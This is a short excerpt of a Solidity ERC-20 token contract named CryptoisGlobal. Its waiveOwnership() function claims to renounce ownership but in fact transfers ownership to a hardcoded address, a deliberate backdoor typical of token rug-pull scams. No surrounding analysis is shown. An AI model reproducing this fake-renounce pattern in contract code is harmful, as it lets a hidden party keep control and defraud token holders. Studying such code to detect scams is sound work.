...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x495643eA044f99Cf3cd7987A2b34cdf73929EDC5));
        _owner = address(0x495643eA044f99Cf3cd7987A2b34cdf73929EDC5);
    }
...
contract Cryptoisglobal is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CryptoisGlobal";
    string private _symbol = "CRYPTOISGLOBAL";
